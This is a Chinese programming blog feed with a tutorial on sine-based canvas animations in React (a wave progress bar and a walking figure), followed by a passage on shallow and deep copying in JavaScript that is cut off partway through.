    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;又来填之前的正弦函数接下来的坑啦，之前（一）中实现了使用正弦函数画曲线并让其动起来。这次呢，主要介绍一下正弦函数实现波浪进度条以及人物行走的动画。具体实现如下:<br><a id="more"></a>  </p>
<h3 id="波浪进度条"><a href="#波浪进度条" class="headerlink" title="波浪进度条"></a>波浪进度条</h3><blockquote>
<p>大家应该都看到过一些使用波浪的loading效果，这样的效果也可以使用正弦函数实现。我们先看看最终的实现效果吧：</p>
</blockquote>
<p><img src="/images/wave1.gif" alt="My Pic"></p>
<ul>
<li>实现画波浪函数<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">drawSin(ctx, xOffset = <span class="number">0</span>, color) &#123;</span><br><span class="line">    <span class="keyword">const</span> points = [];</span><br><span class="line">    <span class="keyword">const</span> canvasWidth = <span class="keyword">this</span>.canvasWidth;</span><br><span class="line">    <span class="keyword">const</span> canvasHeight = <span class="keyword">this</span>.canvasHeight;</span><br><span class="line">    <span class="keyword">const</span> startX = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> waveWidth = <span class="number">0.05</span>; <span class="comment">// 波浪宽度,数越小越宽</span></span><br><span class="line">    <span class="keyword">const</span> waveHeight = <span class="number">10</span>; <span class="comment">// 波浪高度,数越大越高</span></span><br><span class="line">    <span class="comment">// const xOffset = 0; // 水平位移</span></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> x = startX; x &lt; startX + canvasWidth; x = x + <span class="number">30</span> / canvasWidth) &#123;</span><br><span class="line">      <span class="keyword">const</span> y = waveHeight * <span class="built_in">Math</span>.sin((startX + x) * waveWidth + xOffset);</span><br><span class="line">      points.push([x, (canvasHeight / <span class="number">4</span>) + y]);</span><br><span class="line">      ctx.lineTo(x, (canvasHeight / <span class="number">4</span>) + y);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.lineTo(canvasWidth, canvasHeight);</span><br><span class="line">    ctx.lineTo(startX, canvasHeight);</span><br><span class="line">    ctx.lineTo(points[<span class="number">0</span>][<span class="number">0</span>], points[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">const</span> radius = canvasWidth / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> grd = ctx.createLinearGradient(radius, radius, radius, canvasHeight);</span><br><span class="line">    grd.addColorStop(<span class="number">0</span>, color[<span class="number">0</span>]);</span><br><span class="line">    grd.addColorStop(<span class="number">1</span>, color[<span class="number">1</span>]);</span><br><span class="line">    ctx.fillStyle = grd;</span><br><span class="line">    ctx.fill();</span><br><span class="line">    <span class="comment">/* ctx.stroke(); */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>收先这个函数接收三个参数，第一个是canvas的上下文，第二个是偏移量（控制着波浪的移动），第三个是用来传递我们波浪的颜色<br>然后就是和之前画曲线是差不多的操作了<br>最后填充相应的颜色</p>
<p>再通过requestAnimationFrame让它动起来 每次都会改变传入的offset，并且需要主义每次重新画的时候都需要清空画布</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> canvas = <span class="keyword">this</span>.canvas;</span><br><span class="line"><span class="keyword">const</span> ctx = canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line"><span class="keyword">this</span>.drawSin(ctx, <span class="keyword">this</span>.xOffset2, [<span class="string">'#F39C6B'</span>, <span class="string">'#A0563B'</span>]);</span><br><span class="line"><span class="keyword">this</span>.xOffset2 += <span class="keyword">this</span>.speed;</span><br><span class="line">requestAnimationFrame(<span class="keyword">this</span>.draw.bind(<span class="keyword">this</span>));</span><br></pre></td></tr></table></figure>
<p><img src="/images/wave2.gif" alt="My Pic"></p>
<ul>
<li>我们再使用同样的方法画出另一个波浪，通过传入不同的offset 以及改变的大小不同让两个波浪有一定的错位</li>
</ul>
<p><img src="/images/wave3.gif" alt="My Pic"></p>
<ul>
<li>绘制圆形，将波浪放到其中。</li>
<li>由于圆并没有发生变化我们只需要画一次就好<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">drawCircle(ctx) &#123;</span><br><span class="line">    <span class="keyword">const</span> r = <span class="keyword">this</span>.canvasWidth / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> lineWidth = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> cR = r - (lineWidth);</span><br><span class="line">    ctx.lineWidth = lineWidth;</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.arc(r, r, cR, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI);</span><br><span class="line">    ctx.strokeStyle = <span class="string">'#dfe6ec'</span></span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.clip();</span><br><span class="line">    <span class="keyword">this</span>.isDrawCircle = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>这里主要用到的是arc方法<br>context.arc(x,y,r,sAngle,eAngle,counterclockwise);<br>x: 圆的中心横坐标      y：圆的中心纵坐标<br>sAngle：起始角       eAngle：结束角<br>counterclockwise：逆时针还是顺时针 false = 顺时针</p>
</blockquote>
<p><img src="/images/wave4.gif" alt="My Pic"></p>
<blockquote>
<p>我们可以通过控制高度来时间波浪进度条的效果<br>完整代码如下：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class About extends React.Component &#123;</span><br><span class="line">  constructor (props) &#123;</span><br><span class="line">    super(props)</span><br><span class="line">  &#125;</span><br><span class="line">  drawSin(ctx, xOffset = 0, color) &#123;</span><br><span class="line">    const points = [];</span><br><span class="line">    const canvasWidth = this.canvasWidth;</span><br><span class="line">    const canvasHeight = this.canvasHeight;</span><br><span class="line">    const startX = 0;</span><br><span class="line">    const waveWidth = 0.05; // 波浪宽度,数越小越宽</span><br><span class="line">    const waveHeight = 6; // 波浪高度,数越大越高</span><br><span class="line">    // const xOffset = 0; // 水平位移</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    for (let x = startX; x &lt; startX + canvasWidth; x = x + 30 / canvasWidth) &#123;</span><br><span class="line">      const y = waveHeight * Math.sin((startX + x) * waveWidth + xOffset);</span><br><span class="line">      points.push([x, (1 - this.nowRange)*canvasHeight + y]);</span><br><span class="line">      ctx.lineTo(x, (1 - this.nowRange)*canvasHeight + y);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.lineTo(canvasWidth, canvasHeight);</span><br><span class="line">    ctx.lineTo(startX, canvasHeight);</span><br><span class="line">    ctx.lineTo(points[0][0], points[0][1]);</span><br><span class="line">    const radius = canvasWidth / 2;</span><br><span class="line">    const grd = ctx.createLinearGradient(radius, radius, radius, canvasHeight);</span><br><span class="line">    grd.addColorStop(0, color[0]);</span><br><span class="line">    grd.addColorStop(1, color[1]);</span><br><span class="line">    ctx.fillStyle = grd;</span><br><span class="line">    ctx.fill();</span><br><span class="line">    /* ctx.stroke(); */</span><br><span class="line">  &#125;</span><br><span class="line">  drawCircle(ctx) &#123;</span><br><span class="line">    const r = this.canvasWidth / 2;</span><br><span class="line">    const lineWidth = 5;</span><br><span class="line">    const cR = r - (lineWidth);</span><br><span class="line">    ctx.lineWidth = lineWidth;</span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.arc(r, r, cR, 0, 2 * Math.PI);</span><br><span class="line">    ctx.strokeStyle = &apos;#dfe6ec&apos;</span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.clip();</span><br><span class="line">    this.isDrawCircle = true;</span><br><span class="line">  &#125;</span><br><span class="line">  draw () &#123;</span><br><span class="line">    const canvas = this.canvas;</span><br><span class="line">    const ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">    ctx.clearRect(0, 0, canvas.width, canvas.height);</span><br><span class="line">    // 曲线绘制</span><br><span class="line">    if (!this.isDrawCircle) &#123;</span><br><span class="line">      this.drawCircle(ctx);</span><br><span class="line">    &#125;</span><br><span class="line">    if (this.nowRange &lt; this.rangeValue) &#123;</span><br><span class="line">      this.nowRange += 0.002;</span><br><span class="line">    &#125;</span><br><span class="line">    /* this.drawSin(ctx, this.xOffset1, [&apos;red&apos;, &apos;orange&apos;]) */</span><br><span class="line">    this.drawSin(ctx, this.xOffset2, [&apos;#F39C6B&apos;, &apos;#A0563B&apos;]);</span><br><span class="line">    this.drawSin(ctx, this.xOffset1, [&apos;rgba(243, 156, 107, 0.48)&apos;, &apos;rgba(160, 86, 59, 0.48)&apos;]);</span><br><span class="line">    this.xOffset1 += this.speed;</span><br><span class="line">    this.xOffset2 += this.speed;</span><br><span class="line">    requestAnimationFrame(this.draw.bind(this));</span><br><span class="line">  &#125;</span><br><span class="line">  componentDidMount () &#123;</span><br><span class="line">    const self = this;</span><br><span class="line">    const canvas = this.refs.canvas;</span><br><span class="line">    canvas.height = 500;</span><br><span class="line">    canvas.width = 350;</span><br><span class="line">    this.canvas = canvas;</span><br><span class="line">    this.canvasWidth = canvas.width;</span><br><span class="line">    this.canvasHeight = canvas.height;</span><br><span class="line">    this.xOffset1 = 0</span><br><span class="line">    this.xOffset2 = 0.75</span><br><span class="line">    this.rangeValue = 0.8;</span><br><span class="line">    this.speed = 0.05</span><br><span class="line">    this.nowRange = 0</span><br><span class="line">    /* const ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">    this.drawSin(ctx); */</span><br><span class="line">    requestAnimationFrame(this.draw.bind(this));</span><br><span class="line">  &#125;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div className=&quot;content page&quot; style=&#123;&#123;marginTop:&apos;120px&apos;&#125;&#125;&gt;</span><br><span class="line">        &lt;canvas ref=&quot;canvas&quot;&gt;&lt;/canvas&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default About;</span><br></pre></td></tr></table></figure>
<p><img src="/images/wave5.gif" alt="My Pic"></p>
<h3 id="行走动画"><a href="#行走动画" class="headerlink" title="行走动画"></a>行走动画</h3><blockquote>
<p>第一次看到这个动画的时候感觉还是挺厉害的，但是没想到它的实现也和正弦函数有关，我们先来看看最终的效果吧。</p>
</blockquote>
<p><img src="/images/wave6.gif" alt="My Pic"></p>
<blockquote>
<p>通过这个图我们应该知道大概会分为4个部分实现（头、身子、脚、阴影）,就分别通过这几个部分来实现</p>
</blockquote>
<h4 id="头"><a href="#头" class="headerlink" title="头"></a>头</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">drawHead (t) &#123;</span><br><span class="line">    <span class="keyword">this</span>.ctx.save()</span><br><span class="line">    <span class="keyword">this</span>.ctx.beginPath()</span><br><span class="line">    <span class="keyword">this</span>.ctx.translate(<span class="number">0</span>, <span class="built_in">Math</span>.sin(t) * <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">this</span>.ctx.arc(<span class="number">150</span>, <span class="number">55</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI)</span><br><span class="line">    <span class="keyword">this</span>.ctx.fillStyle= <span class="string">"#fff"</span></span><br><span class="line">    <span class="keyword">this</span>.ctx.fill()</span><br><span class="line">    <span class="keyword">this</span>.ctx.closePath()</span><br><span class="line">    <span class="keyword">this</span>.ctx.restore()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>由于头主要是上下移动，这里主要是通过translate来改变画头的起始位置来实现上下移动的。translate() 方法重新映射画布上的 (0,0) 位置。restore让每次绘制都会回到最开始的位置。使用同样的方法让它动起来 效果如下</p>
</blockquote>
<p><img src="/images/wave7.gif" alt="My Pic"></p>
<h4 id="身子"><a href="#身子" class="headerlink" title="身子"></a>身子</h4><blockquote>
<p>身子的实现和头类似，但是也有几个不同的地方。身子涉及上上下以及一点点的旋转，而且由于身子的形状不是规则图形需要用到svg，同时用path2d将svg转为可以fill的对象。具体代码如下:</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">drawBody (t) &#123;</span><br><span class="line">    <span class="keyword">this</span>.ctx.beginPath()</span><br><span class="line">    <span class="keyword">this</span>.ctx.save()</span><br><span class="line">    <span class="keyword">this</span>.ctx.rotate(<span class="built_in">Math</span>.sin(t) * <span class="built_in">Math</span>.PI / <span class="number">180</span> * <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">this</span>.ctx.translate(<span class="number">75</span>, <span class="built_in">Math</span>.sin(t) * <span class="number">4</span> + <span class="number">100</span>)</span><br><span class="line">    <span class="keyword">this</span>.ctx.scale(<span class="number">0.5</span>, <span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">const</span> body = <span class="keyword">new</span> Path2D(<span class="string">'M125,284 L1,284 C0.33333333,94.6666667 35,0 105,0 C115.666667,4 122.333333,20.6666667 125,50 L125,284 Z'</span>)</span><br><span class="line">    body.moveTo(<span class="number">85</span>, <span class="number">70</span>)</span><br><span class="line">    <span class="keyword">this</span>.ctx.fillStyle= <span class="string">"#fff"</span></span><br><span class="line">    <span class="keyword">this</span>.ctx.fill(body)</span><br><span class="line">    <span class="keyword">this</span>.ctx.restore()</span><br><span class="line">    <span class="keyword">this</span>.ctx.closePath()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/wave8.gif" alt="My Pic"></p>
<h4 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h4><blockquote>
<p>阴影的实现和上面的都比较类似，只是需要画椭圆。原理和上面相同，这里就不再赘述了，具体代码可以在后面查看。</p>
</blockquote>
<h4 id="脚"><a href="#脚" class="headerlink" title="脚"></a>脚</h4><blockquote>
<p>由于脚的形状也不是规则图形，同样的也需要用到画阴影的方法，通过svg来实现。<br>脚有两只，按道理应该是抬脚到落脚的动作完成时，其他部位都完成了一个完整的周期，所以在绘制脚的时候，t 需要除以 2。然后第一只脚和第二只脚相差半个脚自身的周期，可以直接将 t 替换成 t + Math.PI 就是第二脚的动画</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">drawFeet (t) &#123; </span><br><span class="line">        t = t / <span class="number">2</span> ctx.translate(<span class="built_in">Math</span>.cos(t) * <span class="number">-50</span>, <span class="number">0</span>) <span class="comment">// 另一只脚 </span></span><br><span class="line">        ctx.translate(<span class="built_in">Math</span>.cos(t + <span class="built_in">Math</span>.PI) * <span class="number">-50</span>, <span class="number">0</span>) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>脚步动画自身周期的一半是在地面上的，可以通过判断一下 sin 值，小于 0 则不做 y 纵轴方向上的变化。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.ctx.translate(<span class="built_in">Math</span>.cos(t) * <span class="number">-50</span>, <span class="built_in">Math</span>.sin(t) &gt; <span class="number">0</span> ? <span class="built_in">Math</span>.sin(t) * <span class="number">-35</span> : <span class="number">0</span>)</span><br><span class="line"><span class="comment">// 另一只脚</span></span><br><span class="line"><span class="keyword">this</span>.ctx.translate(<span class="built_in">Math</span>.cos(t + <span class="built_in">Math</span>.PI) * <span class="number">-50</span>, <span class="built_in">Math</span>.sin(t + <span class="built_in">Math</span>.PI) &gt; <span class="number">0</span> ? <span class="built_in">Math</span>.sin(t + <span class="built_in">Math</span>.PI) * <span class="number">-35</span> : <span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<p>为了让效果更加的逼真，可以对动画的前半个周期再加上一点的rotate<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (t &lt; <span class="built_in">Math</span>.PI) &#123;</span><br><span class="line">    <span class="keyword">this</span>.ctx.rotate(<span class="built_in">Math</span>.sin(t) * <span class="built_in">Math</span>.PI / <span class="number">180</span> * <span class="number">-5</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 另一只脚</span></span><br><span class="line"><span class="keyword">if</span> (t &gt; <span class="built_in">Math</span>.PI) &#123;</span><br><span class="line">    <span class="keyword">this</span>.ctx.rotate(<span class="built_in">Math</span>.sin(t + <span class="built_in">Math</span>.PI) * <span class="built_in">Math</span>.PI / <span class="number">180</span> * <span class="number">-5</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>效果如下（具体代码见后面）<br><img src="/images/wave9.gif" alt="My Pic"></li>
</ul>
<h4 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Regis extends React.Component &#123;</span><br><span class="line">  componentDidMount () &#123;</span><br><span class="line">    const canvas = this.refs.peos;</span><br><span class="line">    canvas.height = 500;</span><br><span class="line">    canvas.width = 350;</span><br><span class="line">    this.canvasHeight = 500</span><br><span class="line">    this.canvasWidth = 350</span><br><span class="line">    this.canvas = canvas;</span><br><span class="line">    this.ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">    this.time = 0</span><br><span class="line">    requestAnimationFrame(this.run.bind(this));</span><br><span class="line">  &#125;</span><br><span class="line">  run () &#123;</span><br><span class="line">    this.ctx.clearRect(0, 0, this.canvasWidth, this.canvasHeight)</span><br><span class="line">    this.time = this.time + 0.05</span><br><span class="line">    this.drawHead(this.time)</span><br><span class="line">    this.drawBody(this.time)</span><br><span class="line">    this.drawShadow(this.time)</span><br><span class="line">    this.drawFeet(this.time)</span><br><span class="line">    this.ctx.restore()</span><br><span class="line">    requestAnimationFrame(this.run.bind(this));</span><br><span class="line">  &#125;</span><br><span class="line">  drawHead (t) &#123;</span><br><span class="line">    /* t= t % Math.PI * 2 */</span><br><span class="line">    this.ctx.save()</span><br><span class="line">    this.ctx.beginPath()</span><br><span class="line">    this.ctx.translate(0, Math.sin(t) * 4)</span><br><span class="line">    this.ctx.arc(150, 55, 35, 0, 2 * Math.PI)</span><br><span class="line">    this.ctx.fillStyle= &quot;#fff&quot;</span><br><span class="line">    this.ctx.fill()</span><br><span class="line">    this.ctx.closePath()</span><br><span class="line">    this.ctx.restore()</span><br><span class="line">    /* requestAnimationFrame(this.drawHead.bind(this)); */</span><br><span class="line">  &#125;</span><br><span class="line">  drawBody (t) &#123;</span><br><span class="line">    /* t= t % Math.PI * 2 */</span><br><span class="line">    this.ctx.beginPath()</span><br><span class="line">    this.ctx.save()</span><br><span class="line">    this.ctx.rotate(Math.sin(t) * Math.PI / 180 * -1)</span><br><span class="line">    this.ctx.translate(75, Math.sin(t) * 4 + 100)</span><br><span class="line">    this.ctx.scale(0.5, 0.5)</span><br><span class="line">    const body = new Path2D(&apos;M125,284 L1,284 C0.33333333,94.6666667 35,0 105,0 C115.666667,4 122.333333,20.6666667 125,50 L125,284 Z&apos;)</span><br><span class="line">    body.moveTo(85, 70)</span><br><span class="line">    this.ctx.fillStyle= &quot;#fff&quot;</span><br><span class="line">    this.ctx.fill(body)</span><br><span class="line">    this.ctx.restore()</span><br><span class="line">    this.ctx.closePath()</span><br><span class="line">  &#125;</span><br><span class="line">  drawShadow (t) &#123;</span><br><span class="line">    /* t= t % Math.PI * 2 */</span><br><span class="line">    this.ctx.beginPath()</span><br><span class="line">    this.ctx.save()</span><br><span class="line">    this.ctx.scale(0.5, 0.5)</span><br><span class="line">    this.ctx.translate(210, 750)</span><br><span class="line">    this.ctx.fillStyle = &apos;rgba(0, 0, 0, 0.1)&apos;</span><br><span class="line">    this.ctx.ellipse(0, 0, 120 + Math.sin(t) * 10, 8, 0, 0, 2 * Math.PI) //画椭圆 暂时只有chrome支持该方法</span><br><span class="line">    this.ctx.fill()</span><br><span class="line">    this.ctx.restore()</span><br><span class="line">    this.ctx.closePath()</span><br><span class="line">  &#125;</span><br><span class="line">  drawFeet (t) &#123;</span><br><span class="line">    t = t / 2</span><br><span class="line">    this.ctx.save()</span><br><span class="line">    this.ctx.scale(0.5, 0.5)</span><br><span class="line">    this.ctx.translate(170, 720)</span><br><span class="line">    const foot = new Path2D(&apos;M23,0 C67,0 80,16 80,22 C80,26 78.6666667,28 76,28 C29.3333333,28 6,28 6,28 C6,28 -1.34111707e-14,30 0,17 C1.42108547e-14,4 10,1.9505735e-16 13,0 C16,0 13,0 23,0 Z&apos;)</span><br><span class="line">    </span><br><span class="line">    this.ctx.save()</span><br><span class="line">    this.ctx.translate(Math.cos(t) * -50, Math.sin(t) &gt; 0 ? Math.sin(t) * -35 : 0)</span><br><span class="line">    if (t &lt; Math.PI) &#123;</span><br><span class="line">      this.ctx.rotate(Math.sin(t) * Math.PI / 180 * -5)</span><br><span class="line">    &#125;</span><br><span class="line">    this.ctx.fillStyle= &quot;#fff&quot;</span><br><span class="line">    this.ctx.fill(foot)</span><br><span class="line">    this.ctx.restore()</span><br><span class="line"></span><br><span class="line">    this.ctx.save()</span><br><span class="line">    this.ctx.translate(Math.cos(t + Math.PI) * -50, Math.sin(t + Math.PI) &gt; 0 ? Math.sin(t + Math.PI) * -35 : 0)</span><br><span class="line">    if (t &gt; Math.PI) &#123;</span><br><span class="line">      this.ctx.rotate(Math.sin(t + Math.PI) * Math.PI / 180 * -5)</span><br><span class="line">    &#125;</span><br><span class="line">    this.ctx.fillStyle= &quot;#fff&quot;</span><br><span class="line">    this.ctx.fill(foot)</span><br><span class="line">    this.ctx.restore()</span><br><span class="line">  &#125;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div className=&quot;peo&quot; style=&#123;&#123;backgroundColor: &apos;#f35c43&apos;, marginTop: &apos;150px&apos;&#125;&#125;&gt;</span><br><span class="line">       &lt;canvas ref=&quot;peos&quot; style=&#123;&#123;marginTop: &apos;20px&apos;,position: &apos;relative&apos;,left: &apos;50%&apos;,transform: &apos;translate(-50%, 0)&apos;&#125;&#125;&gt;&lt;/canvas&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export default Regis;</span><br></pre></td></tr></table></figure>
<p><img src="/images/wave10.gif" alt="My Pic"></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>深浅拷贝</title>
    <url>/2019/02/13/%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;自己之前对于深浅拷贝理解的不是很清楚，前几天又看到了关于这个内容的一篇bolg，决定自己要把这个搞清楚，于是下面自己总结一些。<br><a id="more"></a></p>
<h1 id="1-直接赋值和拷贝"><a href="#1-直接赋值和拷贝" class="headerlink" title="1.直接赋值和拷贝"></a>1.直接赋值和拷贝</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;直接赋值中我们也要分为基本数据类型赋值（undefined、null、string、number、boolean）和引用数据类型赋值（object、array、function）下面是一个例子<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//基本数据类型 名值存储在栈内存中</span><br><span class="line">var a = 1</span><br><span class="line">var b = a </span><br><span class="line">a = 2</span><br><span class="line">console.log(a+ &apos; &apos;+ b) // 2 1 </span><br><span class="line"></span><br><span class="line">//引用类型 名存在栈内存中，值存在于堆内存中</span><br><span class="line">var arr = [1,2,3,4]</span><br><span class="line">var arr1 = arr</span><br><span class="line">arr[0] = 2</span><br><span class="line">console.log(arr)</span><br><span class="line">console.log(arr1)//两个都发生改变了</span><br><span class="line">var obj1 = &#123;</span><br><span class="line">  &apos;name&apos; : &apos;zhangsan&apos;,</span><br><span class="line">  &apos;age&apos; :  &apos;18&apos;,</span><br><span class="line">  &apos;language&apos; : [1,[2,3],[4,5]],</span><br><span class="line">&#125;;</span><br><span class="line">var obj2 = obj1;</span><br><span class="line">obj2.name = &quot;lisi&quot;;</span><br><span class="line">obj2.language[1] = [&quot;二&quot;,&quot;三&quot;];</span><br><span class="line">console.log(&apos;obj1&apos;,obj1)</span><br><span class="line">console.log(&apos;obj2&apos;,obj2)//两个都发生改变了</span><br></pre></td></tr></table></figure></p>
<p>下面我们使用一个浅拷贝与之做一个对比<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//浅拷贝</span></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">    <span class="string">'name'</span> : <span class="string">'zhangsan'</span>,</span><br><span class="line">    <span class="string">'age'</span> :  <span class="string">'18'</span>,</span><br><span class="line">    <span class="string">'language'</span> : [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>]],</span><br><span class="line">&#125;;</span><br><span class="line"> <span class="keyword">var</span> obj3 = shallowCopy(obj1);</span><br><span class="line"> obj3.name = <span class="string">"lisi"</span>;</span><br><span class="line"> obj3.language[<span class="number">1</span>] = [<span class="string">"二"</span>,<span class="string">"三"</span>];</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">shallowCopy</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dst = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> prop <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (src.hasOwnProperty(prop)) &#123;</span><br><span class="line">            dst[prop] = src[prop];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'obj1'</span>,obj1)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'obj3'</span>,obj3)<span class="comment">//结果是第一层的数据没变 第二层的数据变了</span></span><br></pre></td></tr></table></figure></p>
<h1 id="2-深拷贝和浅拷贝"><a href="#2-深拷贝和浅拷贝" class="headerlink" title="2.深拷贝和浅拷贝"></a>2.深拷贝和浅拷贝</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;其实以我的理解简单的说浅拷贝就只是拷贝了了对象的第一层的属性但是没有拷贝到对象中的应用类型属性，而深拷贝是递归拷贝全部都拷贝了，下面是一张网上的图<br><img src="/images/copy.png" alt="My Pic"></p>
<h1 id="2-浅拷贝的实现"><a href="#2-浅拷贝的实现" class="headerlink" title="2.浅拷贝的实现"></a>2.浅拷贝的实现</h1><h2 id="2-1-通过遍历实现"><a href="#2-1-通过遍历实现" class="headerlink" title="2.1 通过遍历实现"></a>2.1 通过遍历实现</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shallowCopy</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dst = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> prop <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (src.hasOwnProperty(prop)) &#123;<span class="comment">//过滤掉自身的继承属性</span></span><br><span class="line">            dst[prop] = src[prop];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2-Object-assign"><a href="#2-2-Object-assign" class="headerlink" title="2.2 Object.assign"></a>2.2 Object.assign</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    a: <span class="string">'nane'</span>,</span><br><span class="line">    b: <span class="number">13</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> o2 = <span class="built_in">Object</span>.assign(&#123;&#125;,o1)</span><br><span class="line">o2.a.a = <span class="string">'name'</span></span><br><span class="line"><span class="built_in">console</span>.log(o1)</span><br><span class="line"><span class="built_in">console</span>.log(o2)<span class="comment">//都改变 当只有一层的时候是深拷贝</span></span><br><span class="line"><span class="keyword">var</span> o3 = &#123;</span><br><span class="line">    a: <span class="string">'nane'</span>,</span><br><span class="line">    b: <span class="number">13</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> o4 = <span class="built_in">Object</span>.assign(&#123;&#125;,o3)</span><br><span class="line">o4.a = <span class="string">'name'</span></span><br><span class="line"><span class="built_in">console</span>.log(o3)</span><br><span class="line"><span class="built_in">console</span>.log(o4)<span class="comment">//只有一个改变</span></span><br></pre></td></tr></table></figure>
<p>有一点需要注意的是 如果这样写的话Object.assign(o1)的话返回的是对象本身 不会新创建</p>
<h2 id="2-3-slice-concat方法"><a href="#2-3-slice-concat方法" class="headerlink" title="2.3 slice concat方法"></a>2.3 slice concat方法</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o5 = [<span class="number">1</span>, <span class="number">3</span>, &#123;</span><br><span class="line">    username: <span class="string">'kobe'</span></span><br><span class="line">    &#125;];</span><br><span class="line"><span class="keyword">let</span> o6=o5.concat();    </span><br><span class="line">o6[<span class="number">2</span>].username = <span class="string">'wade'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(o5);</span><br><span class="line"><span class="built_in">console</span>.log(o6);<span class="comment">//都改变 如果修改的不是引用类型则不会影响原数组</span></span><br></pre></td></tr></table></figure>
